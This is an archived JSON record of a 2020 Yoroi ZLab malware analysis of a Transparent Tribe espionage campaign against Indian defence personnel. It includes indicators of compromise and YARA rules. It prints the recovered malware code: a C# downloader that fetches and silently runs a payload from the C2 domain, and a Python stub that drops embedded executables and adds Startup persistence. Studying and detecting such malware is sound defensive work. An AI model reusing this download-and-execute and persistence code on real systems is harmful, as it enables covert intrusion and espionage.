{
    "id": "52d73df1-6f45-47d5-a95a-57d05b8f5806",
    "created_at": "2023-01-12T15:06:55.197898Z",
    "updated_at": "2025-03-27T02:16:03.259545Z",
    "deleted_at": null,
    "sha1_hash": "3e4ece4e61ab55f4851f761017c8d75977ee66b0",
    "title": "2020-02-21 - Transparent Tribe- Four Years Later",
    "authors": "",
    "file_creation_date": "2022-05-28T15:43:31Z",
    "file_modification_date": "2022-05-28T15:43:31Z",
    "file_size": 2184241,
    "plain_text": "# Transparent Tribe: Four Years Later\n\n**blog.yoroi.company/research/transparent-tribe-four-years-later**\n\n02/21/2020\n\n## Introduction\n\n\nFebruary 21, 2020\n\n\n_Operation Transparent Tribe was first spotted by_ [Proofpoint Researchers in Feb 2016, in a series of espionages](https://www.proofpoint.com/sites/default/files/proofpoint-operation-transparent-tribe-threat-insight-en.pdf)\noperations against Indian diplomats and military personnel in some embassies in Saudi Arabia and Kazakhstan. At\nthat time, the researchers tracked the sources IP in Pakistan, the attacks were part of a wider operation that relies\non multi vector such as watering hole websites and phishing email campaigns delivering custom RATs dubbed\nCrimson and Peppy. These RAT are capable of exfiltrate information, take screenshot and record webcam streams.\n\nThis threat actor has been vanished for a long period, and only the last month appeared another time probably for\nthe actual tensions between two countries. We noticed that the TTP of the group are almost the same leveraging a\nweaponized document with a fake certificate of request of an Indian public fund. So, Cybaze-Yoroi ZLab team\ndecided to dive deep into a technical analysis.\n\n## Technical Analysis\n\nHash 662c3b181467a9d2f40a7b632a4b5fe5ddd201a528ba408badbf7b2375ee3553\n\nThreat New Operation Transparent Tribe Campaign\n\n\nBrief\nDescription\n\n\nMalicious macro document of the new Campaign of Transparent Tribe\n\n\nSsdeep 24576:Nh2axIaansJlyJ1prFnFmbX3ti6iEIb+R9mSXH9tBUnTqHT:Nhfx4nsPyJ1ppnEX3UCICRhXHXe\n\nTable 1. Static information about the malicious macro\n\n\n-----\n\n[The document presents itself as a request for a DSOP FUND (Defence Services Officers](https://pcdaopune.gov.in/web/faq_tab) [Provident Fund). It is a](https://www.bajajfinserv.in/all-about-pf-provident-funds)\nfund where an officer compulsorily deposits some money to Govt on a monthly basis out of his wages / salary.\n\nThe Found is a financial planning for defense personnel. The money is kept by the government and in return a “nonpermanent” profit officially titled as “interest” is given back to the officers at the end of each year. The DSOP fund\nscheme has been setup as a “welfare measure” to the depositors while the wages remain barely meeting ends\notherwise.\n\n### Self-Extracting Macro\n\nAnalyzing the content of the Excel file, we notice that the file contains all the necessary components to perform the\ninfection:\n\n\n-----\n\nThe macro is not heavily obfuscated. The macro components are hidden as Hex or Decimal strings, which will be\ncombined with each other to unleash the next stage of the infection.\n\nThen it is possible to deobfuscate them.\n\n\n-----\n\nThe macro creates two folders inside %PROGRAMDATA% path, “systemidleperf” and “SppExtComTel”.\n\nAnalyzing these files, we have a vbs script, a C# script and a zip file, inside this archive we found 4 PE artifacts:\n\n\n-----\n\n### The SilentCMD Module\n\nThe two dll are legit windows library and are used in support of the malicious behaviour. Instead, the “windproc.scr”\n[and “windprocx.scr” files are the compiled version of the utility SilentCMD publicly available on](https://github.com/stbrenner/SilentCMD)\nGitHub. SilentCMD executes a batch file without opening the command prompt window. If required, the console\noutput can be redirected to a log file.\n\nThe SilentCMD utility is used to execute the commands pushed from the C2, and all of them will be executed without\nshowing anything to the user. However, as previously mentioned, it is curious to notice that the malware installs two\ndifferent variants of the executable, with the only difference in timestamp:\n\n\n-----\n\n### The Real Time Module\n\nThe other extracted file is the “Realtime.cs” file, which is the source of a piece of code written in C#, and it is\ncompiled and run during the execution of the macro. The code is very simple and it has the only purpose to\ndownload another component from the internet:\n```\nusing System;\nusing System.Collections.Generic;\nusing System.Diagnostics;\nusing System.IO;\nusing System.Net;\nusing System.Text;\nnamespace Realtime\n{\n  class Program\n  {\n    static void Main(string[] args)\n    {\n      WebClient wc = new WebClient();\n      wc.DownloadFile(\"http://www.awsyscloud.com/x64i.scr\",\n@\"c:\\\\programdata\\\\systemidleperf\\\\x64i.scr\");\n      Process proc = new Process();\n      proc.StartInfo.FileName = Convert.ToString(args[0]);\n      proc.StartInfo.Arguments = \"/c \" + Convert.ToString(args[1]);\n      proc.StartInfo.UseShellExecute = false;\n      proc.StartInfo.CreateNoWindow = false;\n      proc.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;\n      proc.Start();\n      Environment.Exit(0);\n      //Application.Exit();\n      /* if (!proc.Start())\n       {\n         //Console.WriteLine(\"Error starting\");\n         return;\n       }*/\n      //proc.WaitForExit();\n    }\n  }\n}\n\n```\nThe code is really simple, it has the function of downloading the file “x64i.scr” from the dropurl “awsysclou[.com” and\nthen saves it into the folder “c:\\programdata\\systemidleperf\\”. The file is immediately executed through the C#\nprimitives.\n\n### The X64i.scr File\n\n\n-----\n\nHash 7b455b78698f03c0201b2617fe94c70eb89154568b80e0c9d2a871d648ed6665\n\nThreat New Operation Transparent Tribe Campaign\n\n\nBrief\nDescription\n\n\nPython stub malware of the new Campaign of Transparent Tribe\n\n\nSsdeep 196608:jXm2jfTjEzWt7+eW3TAPHULULN3erOAjsjAbpSzZTfuHO0y7:Lm2jfTgWt65U4UL9eCDHzZfyG7\n\nIcon\n\nTable 2. Static information about the Pyhton Stub\n\nThe icon of the executable let us understand that the malware has been forged through the usage of the\ntool [Pyinstaller. It is a tool that permits a user to create a complete self-contained executable starting from a python](https://www.pyinstaller.org/)\nsource code. However, the two main disadvantages of choosing this solution are the high footprint of the executable\n(reaching more than 7.5MB and this generates a lot of noise inside the system); and the easiness to reverse the\nexecutable to obtain the source code.\n\nSo, after the operation of reversing, the extracted code of the malware is the following:\n\n\n-----\n\n```\n    yp p\nimport socket, time, os, struct, sys\nfrom ctypes.wintypes import HANDLE, DWORD\nimport platform\nimport ctypes\nimport _winreg\nimport time\nimport os\nimport platform\nimport binascii\nimport _winreg\nimport subprocess\nbitstream3 = \"PAYLOAD_ONE\"\nbitstream4 = \"PAYLOAD_TWO\"\noses = os.name\nsystems = platform.system()\nreleases = platform.release()\narchitectures = platform.architecture()[0]\ndef main():\n try:\n  runsameagain()\n except Exception as e:\n   print str(e)\ndef runsameagain():\n  global bitstream3\n  binstr = bytearray(binascii.unhexlify(bitstream3))\n  if not os.path.exists(\"c:\\programdata\\SppExtComTel\"):\n    os.makedirs(\"c:\\programdata\\SppExtComTel\")\n  WriteFile(\"c:\\programdata\\SppExtComTel\\SppExtComTel.scr\",binstr);\n  bootup()\n  subprocess.Popen([\"c:\\programdata\\SppExtComTel\\SppExtComTel.scr\", '--brilliance'])\ndef rundifferentagain():\n  global bitstream4\n  binstr = bytearray(binascii.unhexlify(bitstream4))\n  if not os.path.exists(\"c:\\programdata\\SppExtComTel\"):\n    os.makedirs(\"c:\\programdata\\SppExtComTel\")\n  WriteFile(\"c:\\programdata\\SppExtComTel\\SppExtComTel.scr\",binstr);\n  bootup()\n  subprocess.Popen([\"c:\\programdata\\SppExtComTel\\SppExtComTel.scr\", '--brilliance'])\ndef Streamers():   \n try:                \n  rundifferentagain()\n  return 1        \n except Exception as e:\n  print str(e)\ndef WriteFile(filename,data):\n  with open(filename,\"wb\") as output:\n output.write(data)\ndef bootup():\n  try:\n    from win32com.client import Dispatch\n    from win32com.shell import shell,shellcon\n dpath = \"c:\\programdata\\SppExtComTel\"\n    #print \"before\"\n Start_path = shell.SHGetFolderPath(0, shellcon.CSIDL_STARTUP, 0, 0)\n com_path = os.path.join(Start_path, \"SppExtComTel.lnk\")\n target = os.path.join(dpath,\"SppExtComTel.scr\")\n wDir = dpath\n icon = os.path.join(dpath, \"SppExtComTel.scr\")\n shell = Dispatch('WScript.Shell')\n shortcut = shell.CreateShortCut(com_path)\n\n```\n\n-----\n\n```\n        g p g\n shortcut.WorkingDirectory = wDir\n shortcut.IconLocation = icon\n shortcut.save()\n    #print \"there\"\n    #return True\n  except Exception, e:\n    print str(e)\nif __name__ == \"__main__\":\n try:\n   #print oses\n   #print systems\n   #print releases\n   #print architectures\n   if '.py' not in sys.argv[0]:\n  #sys.exit()\n        #print \"nothign to do\"\n        if systems == 'Windows' and releases == \"7\":\n          main()\n        elif systems == 'Windows' and (releases == \"8.1\" or releases == \"8\"):\n          Streamers()\n        elif systems == 'Windows' and releases == \"10\":\n          #print \"Please use a 64 bit version of python\"\n          #print \"entering streamers\"\n          Streamers()\n        else:\n          Streamers()\n except Exception as e:\n  print str(e)\n\n```\nCode snippet 2\n\nThe python code is very simple to analyze and to explain. The first operation is to declare two global variables,\n“bitstream3” and “bitstream4”. They are the hexadecimal representation of two PE files, that will be deepened in the\nnext sections. These two files are chosen according to the Windows OS version, as visible at the bottom of the code.\n\nAfter that, the script writes the desired payload into the folder “c:\\programdata\\SppExtComTel\\” and immediately\nexecuted it with the parameter “–brilliance”. After that, the malware guarantees its persistence through the creation\nof a LNK file inside the Startup folder.\n\n### The RAT\n\nAs previously stated, the malware payload is the core component of the malware implant.\n\nAs shown in the above figure, the malware is written in .NET framework and the creation date back to 29 Jan 2020.\nIt is the date of the beginning of the malware campaign, also demonstrated by the registration records of the C2. The\nmalware consists of a modular implant that downloads other components from the C2.\n\n\n-----\n\nThe first operation is to provide to the C2 a list of the running processes on the victim machine:\n\nThe method used to send the information to the C2 is the following:\n\n\n-----\n\nFigure 11: C2 communication routine\n\nAfter that, the malware loops in a cycle and waits for some commands coming from the C2:\n\nFigure 12: Routine for the download of new modules\n\nWhen the C2 sends some commands to instruct the bot, the malware downloads and executes other two\ncomponents, which are two DLLs downloaded from the following URLs:\n\n[http[://awsyscloud[.com/[email protected]!aBbU0le8hiInks/B/3500/m1ssh0upUuchCukXanevPozlu[.dll](https://blog.yoroi.company/cdn-cgi/l/email-protection)\n[http[://awsyscloud[.com/[email protected]!aBbU0le8hiInks/D/3500/p2ehtHero0paSth3end.dll](https://blog.yoroi.company/cdn-cgi/l/email-protection)\n\nThe first DLL, once executed, has been renamed in “indexerdervice.dll”. This executable has got a sophisticated\nencryption method of communication with the C2:\n\nWhen the C2 sends some commands to instruct the bot, the malware downloads and executes other two\ncomponents, which are two DLLs downloaded from the following URLs:\n\n[http[://awsyscloud[.com/[email protected]!aBbU0le8hiInks/B/3500/m1ssh0upUuchCukXanevPozlu[.dll](https://blog.yoroi.company/cdn-cgi/l/email-protection)\n[http[://awsyscloud[.com/[email protected]!aBbU0le8hiInks/D/3500/p2ehtHero0paSth3end.dll](https://blog.yoroi.company/cdn-cgi/l/email-protection)\n\nThe first DLL, once executed, has been renamed in “indexerdervice.dll”. This executable has got a sophisticated\nencryption method of communication with the C2:\n\n\n-----\n\nFigure 13: Evidence of the decrypting routine of the certificate\n\nThe above screen shows that the malware requests for an RSA key, which has to be validated by the highlighted\ntext. If the check is positive, the malware can go on to its malicious actions, such as sending of information:\n\nFigure 14: Sending routine of the malware\n\nThe second malware module is a simple DLL having the purpose to download other components from the dropURL\nand then install it:\n\nFigure 15: Evidence of the hard coded AES key\n\n\n-----\n\nThe downloaded code has been encrypted through the Rijndael algorithm with a hard coded key.\n\n## Conclusion\n\nTransparent tribe is back with a new campaign after several years of (apparently) inactivity. We can confirm that this\ncampaign is completely new, relying on the registration record of the C2 that dates back to 29 January 2020. The\n[decoy document presents itself as a request for a DSOP FUND (Defence Services Officers](https://pcdaopune.gov.in/web/faq_tab) [Provident Fund) a](https://www.bajajfinserv.in/all-about-pf-provident-funds)\nprovidence fund for official and military personnel, confirming the espionage and counterintelligence character of this\ncampaign.\n\nAt last, we have no certainty that this campaign has been inactive for 4 years, it may be that it acted quietly, but, now\nthe cyber criminal group is back in view of today’s tensions between the two countries.\n\n## Indicators of Compromise\n\nHashes\n\n8e170fab8cdf11b83089706a2bf4a1748844693f4c6f465e7ba89131df089b48\n113776d3cc8409da498e898bc5e0cafc1762ce1d49e1a86c56b4d841b06efdf8\n39567c9bbbc038574fd1cf569f4f7cfd68403cd817984186b83098ded2433b2c\n08c0c431f7f63136091854af58cd7f9e6d229f90a9b0fda813c52232c030f6ea\nb111a2fef2a5e89f5dc20d7115c0ac2aa65b3e708eec20a41c00316d14b47472\nf718a8661be822e03ac31a4495f7f7bcd3f7685f97b44d81459f3f23abf0e376\n198a5af2125c7c41f531a652d200c083a55a97dc541e3c0b5b253c7329949156\nee363abb00f2c72d8e6144d99244288fa30df4877de76ec533ad6c51bc81dfce\n877426dee9c0954b6c6f7c29b288e97ab0c512fd23eb9ecb13653a15d91ca05a\ncecd41e4e88131a3af162df0239d26c3471658497392649e8dc214bf61939dde\n0a9fb267567bc7011c766d034a127213d73db7182bb8b31af18e0b15d391b49e\n2d2ee85092147f08db4ab93b2952e42a971c6c7491985419ac375feda8674c60\nb0dfb366cc63b4051bd100e5f8d132c400f4c0845d142c723d9c83efd1c52c1f\n7b455b78698f03c0201b2617fe94c70eb89154568b80e0c9d2a871d648ed6665\nc84b720430fa64e852740c810afc25cbaec5e4b03b4dea1d3669bc2fb0e54b97\nDropurl\n\nhxxp://www.[awsyscloud[.com/x64i[.scr\nComponents\n\nm1ssh0upUuchCukXanevPozlu.dll\np2ehtHero0paSth3end.dll\nC2\n\nhxxp://www.[awsyscloud[.com/\nPersistence\n\nWrite LNK file inside startup menu\n\n## Yara Rules\n\n\n-----\n\n```\n      p _ _ _ _ {\n  meta:\n   description = \"Yara rule for the Transparent Tribe Malicious Macro Jan_2020 \"\n   author = \"Yoroi - ZLab\"\n   last_updated = \"2020-02-21\"\n   tlp = \"white\"\n   category = \"informational\"\n  strings:\n   $a1 = {8B 92 BC BE 87 95 BF BD 83}\n   $a2 = {D6 8C C7 68 D5 8D C0 69 D4 8E}\n      $b1 = \"161,36,31,130,137,165,44,167,244,55,198,100,241\"\n  condition:\n   all of them\n}\nrule TransparentTribe_PythonStub_Jan_20 {\n  meta:\n   description = \"Yara rule for the Transparent Tribe Python Stub Jan_2020 \"\n   author = \"Yoroi - ZLab\"\n   last_updated = \"2020-02-21\"\n   tlp = \"white\"\n   category = \"informational\"\n  strings:\n   $a1 = {70 56 6B 77 86 FB D2 6D 2C}\n   $a2 = {A2 43 F9 97 61 F4 E5 1F D7 02}\n      $b1 = \"bpyexpat.pyd\"\n      $b2 = \"bmfc90u.dll\"\n  condition:\n   uint16(0) == 0x5A4D and all of them and filesize > 7MB\n}\nrule TransparentTribe_CrimsonRAT_Jan_20 {\n  meta:\n   description = \"Yara rule for the Transparent Tribe CrimsonRAT Jan_2020 \"\n   author = \"Yoroi - ZLab\"\n   last_updated = \"2020-02-21\"\n   tlp = \"white\"\n   category = \"informational\"\n  strings:\n   $a1 = {03 06 11 24 03 06 11 20 03}\n   $a2 = {B0 3F 5F 7F 11 D5 0A 3A 04}\n      $b1 = \"SppExtComTel\"\n  condition:\n   uint16(0) == 0x5A4D and all of them and filesize > 7MB\n}\nrule TransparentTribe_MaliciousDLLModule_Jan_20 {\n  meta:\n   description = \"Yara rule for the Transparent Tribe CrimsonRAT Jan_2020 \"\n   author = \"Yoroi - ZLab\"\n   last_updated = \"2020-02-21\"\n   tlp = \"white\"\n   category = \"informational\"\n  strings:\n   $a1 = {00 F1 01 8D 19 71 00 F1 01 7D 06 71}\n   $a2 = {86 08 4E 03 57 00 59 00 CC}\n      $a3 = \"6f6e6c79706172616e6f696473757276697665\" ascii wide\n      $a4 = \"shemypolandar*kotlin\" ascii wide\n      $b1 = \"FC4302A8973108F7B86565D5A49182DED2B0BF31\"\n      $b2 = \"PrivateMemorySize64\"\n      $b3 = \"Hi0-78LoupIks2jMn\" wide\n  condition:\n   uint16(0) == 0x5A4D and (all of ($a*) or all of ($b*)) \n}\n\n```\n_This blog post was authored by Luigi Martire, Pietro Melillo and Antonio Pirozzi of Cybaze-Yoroi ZLAB_\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-02-21 - Transparent Tribe- Four Years Later.pdf"
    ],
    "report_names": [
        "2020-02-21 - Transparent Tribe- Four Years Later.pdf"
    ],
    "threat_actors": [
        {
            "id": "fce5181c-7aab-400f-bd03-9db9e791da04",
            "created_at": "2022-10-25T15:50:23.759799Z",
            "updated_at": "2025-03-27T02:00:55.540135Z",
            "deleted_at": null,
            "main_name": "Transparent Tribe",
            "aliases": [
                "Transparent Tribe",
                "COPPER FIELDSTONE",
                "APT36",
                "Mythic Leopard",
                "ProjectM"
            ],
            "source_name": "MITRE:Transparent Tribe",
            "tools": [
                "DarkComet",
                "ObliqueRAT",
                "njRAT",
                "Peppy"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "c68fa27f-e8d9-4932-856b-467ccfe39997",
            "created_at": "2023-01-06T13:46:38.450585Z",
            "updated_at": "2025-03-27T02:00:02.836543Z",
            "deleted_at": null,
            "main_name": "Operation C-Major",
            "aliases": [
                "C-Major",
                "Transparent Tribe",
                "Mythic Leopard",
                "ProjectM",
                "APT 36",
                "TMP.Lapis",
                "Green Havildar",
                "COPPER FIELDSTONE",
                "APT36",
                "Earth Karkaddan",
                "Storm-0156"
            ],
            "source_name": "MISPGALAXY:Operation C-Major",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "66fc98f4-8978-401e-9b73-81c3d5f1e44c",
            "created_at": "2024-05-01T02:03:08.050109Z",
            "updated_at": "2025-03-27T02:05:17.327953Z",
            "deleted_at": null,
            "main_name": "COPPER FIELDSTONE",
            "aliases": [
                "Gorgon Group",
                "Green Havildar ",
                "Mythic Leopard ",
                "Operation C-Major ",
                "Operation Transparent Tribe ",
                "Pasty Draco ",
                "ProjectM ",
                "Storm-0156 ",
                "APT36 "
            ],
            "source_name": "Secureworks:COPPER FIELDSTONE",
            "tools": [
                " DarkComet",
                " LuminosityLink",
                " Peppy",
                " njRAT",
                "Crimson RAT"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "abb24b7b-6baa-4070-9a2b-aa59091097d1",
            "created_at": "2022-10-25T16:07:24.339942Z",
            "updated_at": "2025-03-27T02:02:10.179404Z",
            "deleted_at": null,
            "main_name": "Transparent Tribe",
            "aliases": [
                "APT 36",
                "APT-C-56",
                "Copper Fieldstone",
                "Earth Karkaddan",
                "Green Havildar",
                "Mythic Leopard",
                "Operation C-Major",
                "Operation Honey Trap",
                "Operation Transparent Tribe",
                "ProjectM",
                "STEPPY-KAVACH",
                "Storm-0156",
                "TEMP.Lapis",
                "Transparent Tribe"
            ],
            "source_name": "ETDA:Transparent Tribe",
            "tools": [
                "Amphibeon",
                "Android RAT",
                "Bezigate",
                "Bladabindi",
                "Bozok",
                "Bozok RAT",
                "BreachRAT",
                "Breut",
                "CapraRAT",
                "CinaRAT",
                "Crimson RAT",
                "DarkComet",
                "DarkKomet",
                "ElizaRAT",
                "FYNLOS",
                "Fynloski",
                "Jorik",
                "Krademok",
                "Limepad",
                "Luminosity RAT",
                "LuminosityLink",
                "MSIL",
                "MSIL/Crimson",
                "Mobzsar",
                "MumbaiDown",
                "Oblique RAT",
                "ObliqueRAT",
                "Peppy RAT",
                "Peppy Trojan",
                "Quasar RAT",
                "QuasarRAT",
                "SEEDOOR",
                "Scarimson",
                "SilentCMD",
                "Stealth Mango",
                "UPDATESEE",
                "USBWorm",
                "Waizsar RAT",
                "Yggdrasil",
                "beendoor",
                "klovbot",
                "njRAT"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673536015,
    "ts_updated_at": 1743041763,
    "ts_creation_date": 1653752611,
    "ts_modification_date": 1653752611,
    "files": {
        "pdf": "https://archive.orkl.eu/3e4ece4e61ab55f4851f761017c8d75977ee66b0.pdf",
        "text": "https://archive.orkl.eu/3e4ece4e61ab55f4851f761017c8d75977ee66b0.txt",
        "img": "https://archive.orkl.eu/3e4ece4e61ab55f4851f761017c8d75977ee66b0.jpg"
    }
}